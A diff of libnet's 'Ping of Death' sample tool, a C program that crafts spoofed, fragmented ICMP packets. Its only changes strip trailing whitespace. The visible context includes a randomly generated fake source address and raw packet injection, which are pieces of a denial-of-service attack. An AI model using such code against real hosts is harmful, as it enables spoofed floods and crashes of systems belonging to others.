@@ -52,8 +52,8 @@ main(int argc, char **argv)
     u_char *data;
     int c, i, flags, offset, len;
     char errbuf[LIBNET_ERRBUF_SIZE];
-  
-    printf("libnet 1.1 Ping of Death[raw]\n"); 
+
+    printf("libnet 1.1 Ping of Death[raw]\n");
 
     /*
      *  Initialize the library.  Root priviledges are required.
@@ -62,7 +62,7 @@ main(int argc, char **argv)
             LIBNET_RAW4,                            /* injection type */
             NULL,                                   /* network interface */
             errbuf);                                /* errbuf */
- 
+
     if (l == NULL)
     {
         fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
@@ -78,7 +78,7 @@ main(int argc, char **argv)
     /* get random src addr. */
     libnet_seed_prand(l);
     fakesrc = libnet_get_prand(LIBNET_PRu32);
-  
+
     data = malloc(FRAG_LEN);
     for (i = 0 ; i < FRAG_LEN ; i++)
     {
@@ -121,7 +121,7 @@ main(int argc, char **argv)
             goto bad;
         }
         /* no reason to do this */
-        libnet_toggle_checksum(l, icmp, 0); 
+        libnet_toggle_checksum(l, icmp, 0);
 
         ip = libnet_build_ipv4(
             LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H + len, /* length */
